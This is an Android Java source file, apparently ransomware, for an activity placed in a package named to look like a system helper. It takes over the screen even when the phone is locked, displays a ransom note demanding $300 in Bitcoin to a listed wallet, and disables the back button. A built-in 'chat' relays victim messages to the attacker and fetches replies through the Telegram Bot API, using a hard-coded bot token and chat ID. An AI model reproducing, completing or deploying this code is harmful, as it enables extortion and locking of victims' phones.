package com.system.helper;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class RansomActivity extends Activity {
    private static final String BOT_TOKEN = "8602800631:AAFVtzzFa0LldybopAEKi_16nADgsRDC8tM";
    private static final String CHAT_ID = "8558234600";
    
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private TextView chatDisplay;
    private EditText chatInput;
    private Button sendBtn;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        );
        setContentView(R.layout.activity_ransom);
        
        // Ransom note
        TextView ransomNote = findViewById(R.id.ransomNote);
        ransomNote.setText(
            "🔥 YOUR FILES HAVE BEEN ENCRYPTED!\n\n" +
            "All your photos, contacts, and messages are stolen.\n\n" +
            "💰 Send $300 in Bitcoin to:\n" +
            "bc1q69tmqhm44j7pfclykn3wxq43g9cmagh6f0cf95\n\n" +
            "📱 You can chat with us below to negotiate.\n" +
            "🔑 Enter decryption key below to unlock:\n"
        );
        
        // --- CHAT FEATURE ---
        chatDisplay = findViewById(R.id.chatDisplay);
        chatInput = findViewById(R.id.chatInput);
        sendBtn = findViewById(R.id.sendBtn);
        
        chatDisplay.setText("💬 Chat started. Type your message below.\n");
        
        sendBtn.setOnClickListener(v -> {
            String msg = chatInput.getText().toString().trim();
            if (!msg.isEmpty()) {
                sendToTelegramChat(msg);
                chatDisplay.append("👤 You: " + msg + "\n");
                chatInput.setText("");
            }
        });
        
        // Poll for replies from Telegram
        new Thread(() -> {
            while (true) {
                try {
                    String reply = getTelegramReplies();
                    if (reply != null && !reply.isEmpty()) {
                        mainHandler.post(() -> chatDisplay.append("🤖 Attacker: " + reply + "\n"));
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private void sendToTelegramChat(String message) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            String postData = "chat_id=" + CHAT_ID + "&text=💬 VICTIM: " + 
                              URLEncoder.encode(message, "UTF-8");
            
            URL obj = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            
            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }
    
    private String getTelegramReplies() {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?limit=1";
            URL obj = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("GET");
            
            BufferedReader in = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            conn.disconnect();
            
            // Simple parsing - look for "text":" and extract
            String json = response.toString();
            int textIndex = json.indexOf("\"text\":\"");
            if (textIndex != -1) {
                int start = textIndex + 8;
                int end = json.indexOf("\"", start);
                if (end != -1) {
                    return json.substring(start, end);
                }
            }
        } catch (Exception e) {}
        return null;
    }
    
    @Override
    public void onBackPressed() {
        // Block back button
    }
}
